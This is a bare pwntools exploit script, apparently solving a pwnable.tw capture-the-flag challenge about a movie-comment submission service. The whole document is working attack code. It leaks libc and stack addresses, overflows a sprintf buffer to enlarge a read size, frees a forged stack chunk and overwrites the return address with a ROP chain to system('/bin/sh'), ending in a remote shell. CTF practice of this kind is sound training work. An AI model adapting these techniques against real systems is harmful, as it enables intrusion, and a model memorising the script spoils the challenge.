from pwn import *

def submit(name,age,reason,comment):
    r.sendafter('name: ',name)
    r.sendlineafter('age: ',str(age))
    r.sendafter('movie? ',reason)
    r.sendafter('comment: ',comment)
    name = r.recvline()
    age = r.recvline()
    reason = r.recvline()
    comment = r.recvline()
    return name,age,reason,comment

def submit_crip(age,reason):
    r.sendlineafter('age: ',str(age))
    r.sendafter('movie? ',reason)
    name = r.recvline()
    age = r.recvline()
    reason = r.recvline()
    comment = r.recvline()
    return name,age,reason,comment

def next_sub():
    r.sendafter('<y/n>: ','y')

def finish():
    r.sendafter('<y/n>: ','n')

###Useful addr
fflush_offset = 0x5d330  #xor edx,edx = 0x5d39f
system_offset = 0x3a940
bin_sh_str_offset = 0x158e8b


###Exploit
r = remote('chall.pwnable.tw',10204)

###Leak libc_addr
name,age,reason,comment = submit('a',0,'a'*0x24,'a')
fflush_addr = u32(reason.split(b'a'*0x24)[1][:4])
libc_base = fflush_addr-fflush_offset-0x6f

###Leak stack_addr
next_sub()
name,age,reason,comment = submit('a',0,'a'*0x50,'a')
stack_addr = u32(reason.split(b'a'*0x50)[1][:4])-0x118

###sprintf buf_overflow to overwrite read size
#  Since sprintf appends \x00 to end of string, submit_crip is used to deal with zero length read 
for i in range(8):
    print(i)
    next_sub()
    submit('a',0,'a','a')

for i in range(90):
    print(i+8)
    next_sub()
    submit_crip(0,'a')

###Craft fake block on stack
#  Second chunk used to bypass check in free
next_sub()
submit('a',0,p32(0)+p32(0x41)+b'a'*0x38+p32(0)+p32(0x41),b'a'*0x54+p32(stack_addr+0xb0))


###Free fake block
next_sub()

###Malloc fake block and overwrite ret addr
padding = b'b'*0x4c
ROPchain = p32(libc_base+system_offset)
ROPchain+= b'b'*4
ROPchain+= p32(libc_base+bin_sh_str_offset)
payload = padding+ROPchain
submit(payload,0,'a','a')

###get shell
finish()
r.interactive()
